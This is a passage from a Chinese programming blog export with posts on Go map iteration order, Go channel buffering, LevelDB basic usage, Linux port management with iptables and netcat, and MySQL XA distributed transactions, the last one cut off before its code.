<p>后来在golang官方blog的文章Go maps in action中，确认了这个现象确实存在，而且是Go语言的设计者们有意为之，在这篇文章关于Iteration order的说明中提到</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">When</span> iterating <span class="keyword">over</span> a map <span class="keyword">with</span> a range <span class="keyword">loop</span>, the iteration <span class="keyword">order</span> <span class="keyword">is</span> <span class="keyword">not</span> specified <span class="keyword">and</span> <span class="keyword">is</span> <span class="keyword">not</span> guaranteed <span class="keyword">to</span> be the same <span class="keyword">from</span> one iteration <span class="keyword">to</span> the next. Since Go <span class="number">1</span> the runtime randomizes map iteration <span class="keyword">order</span>, <span class="keyword">as</span> programmers relied <span class="keyword">on</span> the <span class="keyword">stable</span> iteration <span class="keyword">order</span> <span class="keyword">of</span> the previous implementation.</span><br></pre></td></tr></table></figure>

<p>看起来是因为大家在使用Go的map时，可能会在业务逻辑中依赖map key的稳定遍历顺序，而Go底层实现并不保证这一点。因此，Go语言索性对key次序做随机化，以提醒大家不要依赖range遍历返回的key次序。  </p>
<p>奇怪的是，我在golang 1.2环境中编译上面的示例代码后反复运行，输出结果中key的次序是非随机化的。  </p>
<p>不过，不管如何，这个默认的次序肯定是不能依赖的。</p>
<h2 id="2-业务依赖key次序时，如何解决随机化问题其实Go-maps-in-action一文已经给出了解决方法"><a href="#2-业务依赖key次序时，如何解决随机化问题其实Go-maps-in-action一文已经给出了解决方法" class="headerlink" title="2. 业务依赖key次序时，如何解决随机化问题其实Go maps in action一文已经给出了解决方法"></a>2. 业务依赖key次序时，如何解决随机化问题其实Go maps in action一文已经给出了解决方法</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">If you require <span class="selector-tag">a</span> stable iteration <span class="attribute">order</span> you must maintain <span class="selector-tag">a</span> separate data structure that specifies that <span class="attribute">order</span>.</span><br></pre></td></tr></table></figure>

<p>可见，需要另外维护一个数据结构来保持有序的key，然后根据有序key来遍历map。  </p>
<p>下面是本文对上个例子给出的稳定遍历次序的解决方法。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span><br><span class="line">    m[<span class="string">&quot;hello&quot;</span>] = <span class="string">&quot;echo hello&quot;</span></span><br><span class="line">    m[<span class="string">&quot;world&quot;</span>] = <span class="string">&quot;echo world&quot;</span></span><br><span class="line">    m[<span class="string">&quot;go&quot;</span>] = <span class="string">&quot;echo go&quot;</span></span><br><span class="line">    m[<span class="string">&quot;is&quot;</span>] = <span class="string">&quot;echo is&quot;</span></span><br><span class="line">    m[<span class="string">&quot;cool&quot;</span>] = <span class="string">&quot;echo cool&quot;</span></span><br><span class="line"></span><br><span class="line">    sorted_keys := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> k, _ := <span class="keyword">range</span> m &#123;</span><br><span class="line">        sorted_keys = <span class="built_in">append</span>(sorted_keys, k)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// sort &#x27;string&#x27; key in increasing order</span></span><br><span class="line">    sort.Strings(sorted_keys)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, k := <span class="keyword">range</span> sorted_keys &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;k=%v, v=%v\n&quot;</span>, k, m[k])</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的示例中，通过引入sort对key做排序，然后根据有序的keys遍历map即可保证每次遍历map时的key顺序是固定的。  </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> build <span class="keyword">map</span>\_range\_rand.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<p>可以验证，每次的执行结果中key的次序都是按字典序进行升序排列的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ ./map\_range\_rand  </span><br><span class="line"><span class="attribute">k</span>=cool, <span class="attribute">v</span>=echo cool  </span><br><span class="line"><span class="attribute">k</span>=go, <span class="attribute">v</span>=echo go  </span><br><span class="line"><span class="attribute">k</span>=hello, <span class="attribute">v</span>=echo hello  </span><br><span class="line"><span class="attribute">k</span>=is, <span class="attribute">v</span>=echo is  </span><br><span class="line"><span class="attribute">k</span>=world, <span class="attribute">v</span>=echo world</span><br></pre></td></tr></table></figure>
<h2 id="【参考资料】"><a href="#【参考资料】" class="headerlink" title="【参考资料】"></a>【参考资料】</h2><p>Go Blog - <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmdvbGFuZy5vcmcvZ28tbWFwcy1pbi1hY3Rpb24=">Go maps in action<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Maps</tag>
      </tags>
  </entry>
  <entry>
    <title>golang channel 有缓冲 与 无缓冲 的重要区别</title>
    <url>/2019/10/golang-channels/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>golang channel 有缓冲 与 无缓冲 是有重要区别的</p>
<p>我之前天真的认为 有缓冲与无缓冲的区别 只是 无缓冲的 是 默认 缓冲 为 1 的缓冲式</p>
<span id="more"></span>

<p>其实是彻底错误的，无缓冲的与有缓冲 channel 有着重大差别</p>
<p>那就是一个是同步的 一个是非同步的</p>
<p>怎么说？比如</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c1:=<span class="built_in">make</span> (<span class="keyword">chan</span> <span class="type">int</span>)     <span class="comment">//无缓冲</span></span><br><span class="line"></span><br><span class="line">c2:=<span class="built_in">make</span> (<span class="keyword">chan</span> <span class="type">int</span>,<span class="number">1</span>)   <span class="comment">//有缓冲</span></span><br><span class="line"></span><br><span class="line">c1&lt;<span class="number">-1</span></span><br></pre></td></tr></table></figure>

<p>无缓冲的 不仅仅是 向 c1 通道放 1 而是 一直要有别的携程 &lt;-c1 接手了 这个参数，那么 c1&lt;-1 才会继续下去，要不然就一直阻塞着</p>
<p>而 c2&lt;-1 则不会阻塞，因为缓冲大小是 1 （其实是缓冲大小为 0）只有当 放第二个值的时候 第一个还没被人拿走，这时候才会阻塞。</p>
<h2 id="打个比喻"><a href="#打个比喻" class="headerlink" title="打个比喻"></a>打个比喻</h2><p>无缓冲的 就是一个送信人去你家门口送信 ，你不在家 他不走，你一定要接下信，他才会走。</p>
<p>无缓冲保证信能到你手上</p>
<p>有缓冲的 就是一个送信人去你家仍到你家的信箱 转身就走 ，除非你的信箱满了 他必须等信箱空下来。</p>
<p>有缓冲的 保证 信能进你家的邮箱</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Channels</tag>
      </tags>
  </entry>
  <entry>
    <title>LevelDB：使用介绍</title>
    <url>/2019/10/leveldb-usage/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>LevelDB 提供的接口其实很简单，下面举例进行简单说明。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><span id="more"></span>

<ol>
<li>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9sZXZlbGRi">https://github.com/google/leveldb<i class="fa fa-external-link-alt"></i></span></li>
<li>cd leveldb</li>
<li>mkdir -p build &amp;&amp; cd build</li>
<li>cmake -DCMAKE_BUILD_TYPE&#x3D;Release .. &amp;&amp; cmake –build .</li>
<li>make install</li>
</ol>
<h2 id="Code-Demo"><a href="#Code-Demo" class="headerlink" title="Code Demo"></a>Code Demo</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cassert&gt;</span><br><span class="line">#include <span class="string">&quot;leveldb/db.h&quot;</span></span><br><span class="line">#include <span class="string">&quot;leveldb/write_batch.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open a database.</span></span><br><span class="line">    leveldb::DB* db;</span><br><span class="line">    leveldb::Options opts;</span><br><span class="line">    opts.create_if_missing = <span class="literal">true</span>;</span><br><span class="line">    leveldb::Status status = leveldb::DB::Open(opts, <span class="string">&quot;./testdb&quot;</span>, &amp;db);</span><br><span class="line">    assert(status.ok());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Write data.</span></span><br><span class="line">    status = db-&gt;Put(leveldb::WriteOptions(), <span class="string">&quot;name&quot;</span>, <span class="string">&quot;jinhelin&quot;</span>);</span><br><span class="line">    assert(status.ok());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read data.</span></span><br><span class="line">    std::<span class="type">string</span> val;</span><br><span class="line">    status = db-&gt;Get(leveldb::ReadOptions(), <span class="string">&quot;name&quot;</span>, &amp;val);</span><br><span class="line">    assert(status.ok());</span><br><span class="line">    std::cout &lt;&lt; val &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Batch atomic write.</span></span><br><span class="line">    leveldb::WriteBatch batch;</span><br><span class="line">    batch.Delete(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name0&quot;</span>, <span class="string">&quot;jinhelin0&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name1&quot;</span>, <span class="string">&quot;jinhelin1&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name2&quot;</span>, <span class="string">&quot;jinhelin2&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name3&quot;</span>, <span class="string">&quot;jinhelin3&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name4&quot;</span>, <span class="string">&quot;jinhelin4&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name5&quot;</span>, <span class="string">&quot;jinhelin5&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name6&quot;</span>, <span class="string">&quot;jinhelin6&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name7&quot;</span>, <span class="string">&quot;jinhelin7&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name8&quot;</span>, <span class="string">&quot;jinhelin8&quot;</span>);</span><br><span class="line">    batch.Put(<span class="string">&quot;name9&quot;</span>, <span class="string">&quot;jinhelin9&quot;</span>);</span><br><span class="line">    status = db-&gt;Write(leveldb::WriteOptions(), &amp;batch);</span><br><span class="line">    assert(status.ok());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Scan database.</span></span><br><span class="line">    leveldb::Iterator* it = db-&gt;NewIterator(leveldb::ReadOptions());</span><br><span class="line">    <span class="keyword">for</span> (it-&gt;SeekToFirst(); it-&gt;Valid(); it-&gt;Next()) &#123;</span><br><span class="line">        std::cout &lt;&lt; it-&gt;key().ToString() &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; </span><br><span class="line">          it-&gt;value().ToString() &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(it-&gt;status().ok());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Range scan, example: [name3, name8)</span></span><br><span class="line">    <span class="keyword">for</span> (it-&gt;Seek(<span class="string">&quot;name3&quot;</span>); </span><br><span class="line">         it-&gt;Valid() &amp;&amp; it-&gt;key().ToString() &lt; <span class="string">&quot;name8&quot;</span>; </span><br><span class="line">         it-&gt;Next()) &#123;</span><br><span class="line">        std::cout &lt;&lt; it-&gt;key().ToString() &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; </span><br><span class="line">          it-&gt;value().ToString() &lt;&lt; std::endl;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close a database.</span></span><br><span class="line">    <span class="built_in">delete</span> db;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Code-Usage"><a href="#Code-Usage" class="headerlink" title="Code Usage"></a>Code Usage</h2><ol>
<li><p>cd leveldb &amp;&amp; mkdir test</p>
</li>
<li><p>cp build&#x2F;libleveldb.a test&#x2F; &amp;&amp; cd test</p>
</li>
<li><p>vim test.cpp (:set paste Shift + Insert :wq)</p>
</li>
<li><p>g++ -o leveldbTest test.cpp libleveldb.a -lpthread</p>
</li>
<li><p>g++ -o leveldbTest test.cpp libleveldb.a -lpthread -lsnappy (options)</p>
</li>
<li><p>.&#x2F;leveldbTest</p>
</li>
</ol>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">jinhelin</span><br><span class="line"><span class="symbol">name0:</span> jinhelin0</span><br><span class="line"><span class="symbol">name1:</span> jinhelin1</span><br><span class="line"><span class="symbol">name2:</span> jinhelin2</span><br><span class="line"><span class="symbol">name3:</span> jinhelin3</span><br><span class="line"><span class="symbol">name4:</span> jinhelin4</span><br><span class="line"><span class="symbol">name5:</span> jinhelin5</span><br><span class="line"><span class="symbol">name6:</span> jinhelin6</span><br><span class="line"><span class="symbol">name7:</span> jinhelin7</span><br><span class="line"><span class="symbol">name8:</span> jinhelin8</span><br><span class="line"><span class="symbol">name9:</span> jinhelin9</span><br><span class="line"><span class="symbol">name3:</span> jinhelin3</span><br><span class="line"><span class="symbol">name4:</span> jinhelin4</span><br><span class="line"><span class="symbol">name5:</span> jinhelin5</span><br><span class="line"><span class="symbol">name6:</span> jinhelin6</span><br><span class="line"><span class="symbol">name7:</span> jinhelin7</span><br></pre></td></tr></table></figure>

<h2 id="这个例子简单介绍了-LevelDB-的基本用法，包括："><a href="#这个例子简单介绍了-LevelDB-的基本用法，包括：" class="headerlink" title="这个例子简单介绍了 LevelDB 的基本用法，包括："></a>这个例子简单介绍了 LevelDB 的基本用法，包括：</h2><ol>
<li>打开数据库。</li>
<li>写入一条数据。</li>
<li>读取一条数据。</li>
<li>批量原子操作。</li>
<li>范围查找。</li>
<li>关闭数据库。</li>
</ol>
<h2 id="打开数据库"><a href="#打开数据库" class="headerlink" title="打开数据库"></a>打开数据库</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// Open a database.</span></span><br><span class="line">leveldb::DB* db;</span><br><span class="line">leveldb::Options opts;</span><br><span class="line">opts.create_if_missing = <span class="literal">true</span>;</span><br><span class="line">leveldb::Status status = leveldb::DB::Open(opts, <span class="string">&quot;./testdb&quot;</span>, &amp;db);</span><br><span class="line">assert(status.ok());</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>打开 LevelDB 数据库需要三个参数：</p>
<p>leveldb::Options ：控制 DB 行为的一些参数，具体可以参考链接指向的代码。在这里 create_if_missing 为 true 表示如果数据库.&#x2F;testdb 存在就直接打开，不存在就创建。</p>
<p>.&#x2F;testdb ：LevelDB 数据库的根目录。一个 LevelDB 数据库存放在一个目录下。</p>
<p>&amp;db ：用来返回一个 LevelDB 实例。</p>
<p>leveldb::Status ：封装了 leveldb 接口返回的详细信息。</p>
<h2 id="写入一条数据"><a href="#写入一条数据" class="headerlink" title="写入一条数据"></a>写入一条数据</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// Write data.</span></span><br><span class="line">status = db-&gt;Put(leveldb::WriteOptions(), <span class="string">&quot;name&quot;</span>, <span class="string">&quot;jinhelin&quot;</span>);</span><br><span class="line">assert(status.ok());</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Put 接口的三个参数：</p>
<p>leveldb::WriteOptions ：目前里面只有一个 sync 成员。表示写完 WAL 后是否需要 flush。</p>
<p>另外两个参数分别是本次写入数据的 Key 和 Value。</p>
<h2 id="读取一条数据"><a href="#读取一条数据" class="headerlink" title="读取一条数据"></a>读取一条数据</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// Read data.</span></span><br><span class="line">std::<span class="type">string</span> val;</span><br><span class="line">status = db-&gt;Get(leveldb::ReadOptions(), <span class="string">&quot;name&quot;</span>, &amp;val);</span><br><span class="line">assert(status.ok());</span><br><span class="line">std::cout &lt;&lt; val &lt;&lt; std::endl;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Get 接口和 Put 接口比较像，除了 leveldb::ReadOptions 参数是用来控制读操作的，具体见链接指向的代码。</p>
<h2 id="批量原子修改"><a href="#批量原子修改" class="headerlink" title="批量原子修改"></a>批量原子修改</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// Batch atomic write.</span></span><br><span class="line">leveldb::WriteBatch batch;</span><br><span class="line">batch.Delete(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name0&quot;</span>, <span class="string">&quot;jinhelin0&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name1&quot;</span>, <span class="string">&quot;jinhelin1&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name2&quot;</span>, <span class="string">&quot;jinhelin2&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name3&quot;</span>, <span class="string">&quot;jinhelin3&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name4&quot;</span>, <span class="string">&quot;jinhelin4&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name5&quot;</span>, <span class="string">&quot;jinhelin5&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name6&quot;</span>, <span class="string">&quot;jinhelin6&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name7&quot;</span>, <span class="string">&quot;jinhelin7&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name8&quot;</span>, <span class="string">&quot;jinhelin8&quot;</span>);</span><br><span class="line">batch.Put(<span class="string">&quot;name9&quot;</span>, <span class="string">&quot;jinhelin9&quot;</span>);</span><br><span class="line">status = db-&gt;Write(leveldb::WriteOptions(), &amp;batch);</span><br><span class="line">assert(status.ok());</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>LevelDB 的 Write 接口支持原子地修改多条数据，主要参数是 leveldb::WriteBatch 。</p>
<h2 id="范围查找"><a href="#范围查找" class="headerlink" title="范围查找"></a>范围查找</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// Scan database.</span></span><br><span class="line">leveldb::Iterator* it = db-&gt;NewIterator(leveldb::ReadOptions());</span><br><span class="line"><span class="keyword">for</span> (it-&gt;SeekToFirst(); it-&gt;Valid(); it-&gt;Next()) &#123;</span><br><span class="line">    std::cout &lt;&lt; it-&gt;key().ToString() &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; </span><br><span class="line">      it-&gt;value().ToString() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">assert(it-&gt;status().ok());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Range scan, example: [name3, name8)</span></span><br><span class="line"><span class="keyword">for</span> (it-&gt;Seek(<span class="string">&quot;name3&quot;</span>); </span><br><span class="line">     it-&gt;Valid() &amp;&amp; it-&gt;key().ToString() &lt; <span class="string">&quot;name8&quot;</span>; </span><br><span class="line">     it-&gt;Next()) &#123;</span><br><span class="line">    std::cout &lt;&lt; it-&gt;key().ToString() &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; </span><br><span class="line">      it-&gt;value().ToString() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>LevelDB 通过提供 leveldb::Iterator 来实现范围查找。</p>
<h2 id="关闭数据库"><a href="#关闭数据库" class="headerlink" title="关闭数据库"></a>关闭数据库</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// Close a database.</span></span><br><span class="line"><span class="built_in">delete</span> db;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>最后，关闭数据库时需要删除掉创建的数据库实例，让其调用析构函数处理一些收尾工作。</p>
<h2 id="Snapshot"><a href="#Snapshot" class="headerlink" title="Snapshot"></a>Snapshot</h2><p>LevelDB 还提供了快照（Snapshot）的功能，让应用可以获得数据库在某一时刻的只读的一致性数据。可以利用 LevelDB 的 Snapshot 功能实现类似 MySQL 的 MVCC。</p>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>LevelDB Source Code: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9sZXZlbGRi">https://github.com/google/leveldb<i class="fa fa-external-link-alt"></i></span></p>
<p>LevelDB 参考文档: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9sZXZlbGRiL2Jsb2IvbWFzdGVyL2RvYy9pbmRleC5tZA==">https://github.com/google/leveldb/blob/master/doc/index.md<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>LevelDB</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 如何开放端口和关闭端口</title>
    <url>/2019/10/linux-port/</url>
    <content><![CDATA[<h2 id="一、查看哪些端口被打开-netstat-anp"><a href="#一、查看哪些端口被打开-netstat-anp" class="headerlink" title="一、查看哪些端口被打开 netstat -anp"></a>一、查看哪些端口被打开 netstat -anp</h2><h2 id="二、关闭端口号"><a href="#二、关闭端口号" class="headerlink" title="二、关闭端口号"></a>二、关闭端口号</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">$ iptables -A OUTPUT -<span class="selector-tag">p</span> tcp <span class="attr">--dport</span> <span class="selector-attr">[port]</span> - j DROP</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="三、打开端口号"><a href="#三、打开端口号" class="headerlink" title="三、打开端口号"></a>三、打开端口号</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">$ iptables -A <span class="keyword">INPUT</span> -ptcp <span class="comment">--dport [port] - j ACCEPT</span></span><br></pre></td></tr></table></figure>

<h2 id="四、保存设置"><a href="#四、保存设置" class="headerlink" title="四、保存设置"></a>四、保存设置</h2><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>service iptables save</span><br></pre></td></tr></table></figure>

<h2 id="五、以下是-linux-打开端口命令的使用方法。"><a href="#五、以下是-linux-打开端口命令的使用方法。" class="headerlink" title="五、以下是 linux 打开端口命令的使用方法。"></a>五、以下是 linux 打开端口命令的使用方法。</h2><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">$ nc -lp<span class="number"> 23 </span>&amp;(打开<span class="number"> 23 </span>端口，即 telnet)</span><br><span class="line">$ netstat -an | grep<span class="number"> 23 </span>(查看是否打开<span class="number"> 23 </span>端口)</span><br></pre></td></tr></table></figure>

<h2 id="六、linux-打开端口命令每一个打开的端口，都需要有相应的监听程序才可以"><a href="#六、linux-打开端口命令每一个打开的端口，都需要有相应的监听程序才可以" class="headerlink" title="六、linux 打开端口命令每一个打开的端口，都需要有相应的监听程序才可以"></a>六、linux 打开端口命令每一个打开的端口，都需要有相应的监听程序才可以</h2>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>详解 MySQL 分布式事务 XA（跨数据库事务）</title>
    <url>/2019/10/mysql-xa/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在开发中，为了降低单点压力，通常会根据业务情况进行分表分库，将表分布在不同的库中（库可能分布在不同的机器上）。</p>
<p>在这种场景下，事务的提交会变得相对复杂，因为多个节点（库）的存在，可能存在部分节点提交失败的情况，即事务的ACID特性需要在各个不同的数据库实例中保证。</p>
<span id="more"></span>

<p>比如更新db1库的A表时，必须同步更新db2库的B表，两个更新形成一个事务，要么都成功，要么都失败。</p>
<p>那么我们如何利用mysql实现分布式数据库的事务呢？</p>
<p>Mysql 为我们提供了分布式事务解决方案（<span class="exturl" data-url="aHR0cHM6Ly9kZXYubXlzcWwuY29tL2RvYy9yZWZtYW4vNS43L2VuL3hhLmh0bWw=">https://dev.mysql.com/doc/refman/5.7/en/xa.html<i class="fa fa-external-link-alt"></i></span> 这是mysql5.7的文档）</p>
<h2 id="这里先声明两个概念："><a href="#这里先声明两个概念：" class="headerlink" title="这里先声明两个概念："></a>这里先声明两个概念：</h2><ol>
<li>资源管理器（resource manager）：用来管理系统资源，是通向事务资源的途径。数据库就是一种资源管理器。资源管理还应该具有管理事务提交或回滚的能力。</li>
<li>事务管理器（transaction manager）：事务管理器是分布式事务的核心管理者。事务管理器与每个资源管理器（resource manager）进行通信，协调并完成事务的处理。事务的各个分支由唯一命名进行标识。</li>
</ol>
<p>mysql在执行分布式事务（外部XA）的时候，mysql服务器相当于xa事务资源管理器，与mysql链接的客户端相当于事务管理器。</p>
<h2 id="分布式事务原理：分段式提交"><a href="#分布式事务原理：分段式提交" class="headerlink" title="分布式事务原理：分段式提交"></a>分布式事务原理：分段式提交</h2><p>分布式事务通常采用2PC协议，全称Two Phase Commitment Protocol。该协议主要为了解决在分布式数据库场景下，所有节点间数据一致性的问题。分布式事务通过2PC协议将提交分成两个阶段：</p>
<ol>
<li>prepare;</li>
<li>commit&#x2F;rollback;</li>
</ol>
<p>阶段一为准备（prepare）阶段。即所有的参与者准备执行事务并锁住需要的资源。参与者ready时，向transaction manager报告已准备就绪。</p>
<p>阶段二为提交阶段（commit）。当transaction manager确认所有参与者都ready后，向所有参与者发送commit命令。</p>
<h2 id="事务协调者transaction-manager"><a href="#事务协调者transaction-manager" class="headerlink" title="事务协调者transaction manager"></a>事务协调者transaction manager</h2><p>因为XA 事务是基于两阶段提交协议的，所以需要有一个事务协调者（transaction manager）来保证所有的事务参与者都完成了准备工作(第一阶段)。如果事务协调者（transaction manager）收到所有参与者都准备好的消息，就会通知所有的事务都可以提交了（第二阶段）。MySQL 在这个XA事务中扮演的是参与者的角色，而不是事务协调者（transaction manager）。</p>
<h2 id="Mysql的XA事务分为外部XA和内部XA"><a href="#Mysql的XA事务分为外部XA和内部XA" class="headerlink" title="Mysql的XA事务分为外部XA和内部XA"></a>Mysql的XA事务分为外部XA和内部XA</h2><p>外部XA用于跨多MySQL实例的分布式事务，需要应用层作为协调者，通俗的说就是比如我们在PHP中写代码，那么PHP书写的逻辑就是协调者。应用层负责决定提交还是回滚，崩溃时的悬挂事务。MySQL数据库外部XA可以用在分布式数据库代理层，实现对MySQL数据库的分布式事务支持，例如开源的代理工具：网易的DDB，淘宝的TDDL等等。  </p>
<p>内部XA事务用于同一实例下跨多引擎事务，由Binlog作为协调者，比如在一个存储引擎提交时，需要将提交信息写入二进制日志，这就是一个分布式内部XA事务，只不过二进制日志的参与者是MySQL本身。Binlog作为内部XA的协调者，在binlog中出现的内部xid，在crash recover时，由binlog负责提交。(这是因为，binlog不进行prepare，只进行commit，因此在binlog中出现的内部xid，一定能够保证其在底层各存储引擎中已经完成prepare)。</p>
<h2 id="MySQL-XA事务基本语法"><a href="#MySQL-XA事务基本语法" class="headerlink" title="MySQL XA事务基本语法"></a>MySQL XA事务基本语法</h2><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">XA &#123;START|BEGIN&#125; xid <span class="string">\[JOIN|RESUME\]</span> 启动xid事务 (xid 必须是一个唯一值; 不支持<span class="string">\[JOIN|RESUME\]子句)</span>  </span><br><span class="line">XA END xid <span class="string">\[SUSPEND</span> <span class="string">\[FOR</span> MIGRATE<span class="string">\]\]</span> 结束xid事务 ( 不支持<span class="string">\[SUSPEND</span> <span class="string">\[FOR</span> MIGRATE<span class="string">\]\]</span> 子句)  </span><br><span class="line">XA PREPARE xid 准备、预提交xid事务  </span><br><span class="line">XA COMMIT xid <span class="string">\[ONE</span> PHASE<span class="string">\]</span> 提交xid事务  </span><br><span class="line">XA ROLLBACK xid 回滚xid事务  </span><br><span class="line">XA RECOVER 查看处于PREPARE 阶段的所有事务</span><br></pre></td></tr></table></figure>

<h2 id="PHP调用MYSQL-XA事务示例"><a href="#PHP调用MYSQL-XA事务示例" class="headerlink" title="PHP调用MYSQL XA事务示例"></a>PHP调用MYSQL XA事务示例</h2><p>1、首先要确保mysql开启XA事务支持</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">SHOW <span class="keyword">VARIABLES</span> LIKE <span class="comment">&#x27;%xa%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果innodb_support_xa的值是ON就说明mysql已经开启对XA事务的支持了。如果不是就执行：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> innodb_support_xa = <span class="keyword">ON</span></span><br></pre></td></tr></table></figure>

<p>2、代码如下：</p>
